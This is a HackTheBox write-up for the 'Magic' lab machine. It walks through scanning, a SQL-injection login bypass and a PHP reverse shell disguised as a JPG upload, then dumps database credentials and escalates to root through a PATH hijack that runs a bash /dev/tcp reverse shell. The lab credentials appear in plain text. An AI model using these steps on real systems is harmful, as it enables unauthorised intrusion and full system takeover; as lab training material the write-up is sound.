# MAGIC

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ nmap 10.10.10.185                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 02:20 EDT
Nmap scan report for 10.10.10.185
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 62.63 seconds
                                                                                               
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ nmap 10.10.10.185 -p 22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 02:22 EDT
Nmap scan report for 10.10.10.185
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/magic1.png)

At the bottom left corner it is written that we need to login to be able to upload images.

## GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.185 -q -t 100 -x php,html,txt,phtml
/login.php            (Status: 200) [Size: 4221]
/index.php            (Status: 200) [Size: 4049]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.185/images/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.185/assets/]
/upload.php           (Status: 302) [Size: 2957] [--> login.php]                 
/logout.php           (Status: 302) [Size: 0] [--> index.php] 
```

Here we confirm that `upload.php` redirects to `login.php`.

## LOGIN.PHP

![](https://github.com/Leo-2807/Writeups/blob/main/images/magic2.png)

I used this [cheatsheet](https://github.com/payloadbox/sql-injection-payload-list) and found a very basic sql injection that worked and we were able to log in and access the upload.php page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/magic3.png)

## UPLOAD.PHP

![](https://github.com/Leo-2807/Writeups/blob/main/images/magic4.png)

In order to use this vulnerability we need to find how to access the image we upload.
In the gobuster scan we saw a `/images` directory but on opening the directory it gives a `403 forbidden error`.
I run another gobuster scan on the `/images` directory and find `/uploads` directory.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.185/images -q -t 100 -x php,html,txt,phtml,png
/uploads              (Status: 301) [Size: 321] [--> http://10.10.10.185/images/uploads/]
```
But this directory also gives `403 forbidden error` , So I gobuster scan again and this time we get the image we uploaded and it is accessible to us.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.185/images/uploads -q -t 100 -x php,html,txt,phtml,png
/logo.png             (Status: 200) [Size: 124278]
/test.png             (Status: 200) [Size: 9587] 
```
![](https://github.com/Leo-2807/Writeups/blob/main/images/magic5.png)

## SHELL

Now that we have a way upload images we need to carve a payload to get a command execution.
I took help from this [article](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/).

So first I downloaded the pentestmokey php rev shell and changed the host and port.

Then I renamed the rev shell to `payload.php.jpg` and opened it in hexeditor to insert the jpg magic bytes `FF D8 FF E0` at the beginning.

Now the payload is ready. I uploaded the payload and got a reverse shell.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ nc -lvnp 4444                
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.185] 60104
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:14:06 up  1:41,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
sh: 1: python: not found
$ which python
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## USER.TXT

On enumeration I find a file with some credentials.

```bash
www-data@ubuntu:/var/www/Magic$ ls
ls
assets  db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

I tried connect to the mysql database bur the command is not installed on the machine.
So I tried to find which other mysql executale was present in the `/usr/bin` directory. And there were quite a few of them.

```bash
www-data@ubuntu:/var/www/Magic$ find /usr/bin -name mysql* 2>/dev/null
find /usr/bin -name mysql* 2>/dev/null
/usr/bin/mysqloptimize
/usr/bin/mysqldump
/usr/bin/mysqladmin
/usr/bin/mysqlshow
/usr/bin/mysqld_safe
/usr/bin/mysqlbinlog
/usr/bin/mysqldumpslow
/usr/bin/mysqlcheck
/usr/bin/mysql_ssl_rsa_setup
/usr/bin/mysqlimport
/usr/bin/mysql_tzinfo_to_sql
/usr/bin/mysql_upgrade
/usr/bin/mysqlslap
/usr/bin/mysql_secure_installation
/usr/bin/mysqlrepair
/usr/bin/mysqlanalyze
/usr/bin/mysql_config_editor
/usr/bin/mysqld_multi
/usr/bin/mysql_plugin
/usr/bin/mysql_embedded
/usr/bin/mysql_install_db
/usr/bin/mysqlpump
/usr/bin/mysqlreport
```

Doing a quick google search I found that `mysqldump` can dump sql database innto a file.

```bash
www-data@ubuntu:/var/www/Magic$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
us --host=localhost Magic--password=iamkingtheseu
...snip...
--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-10-12  1:50:25
```

Now we have the password we use su to access user theseus.

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ id
id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```

## ROOT.TXT

On running linpeas I found a interesting file which had the suid bits set to `group users` and as we saw in the id command that's the group of our user theseus.

```bash
-rwsr-x--- 1 root users            22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary)
```

Whenever I enumerate a executable the first thing I do is use ltrace and strace.

Using the ltrace command gave a ton of result. One of the first few lines was the executable using popen to open a file.

```bash
popen("lshw -short", "r") 
```

The executable is not using the full path of the file. This vulnerability can be used to our advantage.

I write a reverse shell in our user's home directory and give it execution permission.

```bash
theseus@ubuntu:~$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.3/9999 0>&1' > lshw
&1' > lshw!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.3/9999 0>&
theseus@ubuntu:~$ chmod +x lshw
chmod +x lshw
```

Now I add the path of our user's home diectory to the PATH variable and execute sysinfo to get a reverse shell as root .

```bash
theseus@ubuntu:~$ export PATH="/home/theseus:$PATH"
export PATH="/home/theseus:$PATH"
theseus@ubuntu:~$ echo $PATH
echo $PATH
/home/theseus:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:~$ cd /bin
cd /bin
theseus@ubuntu:/bin$ ./sysinfo
```

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/magic]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.185] 48286
root@ubuntu:/bin# id
id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
```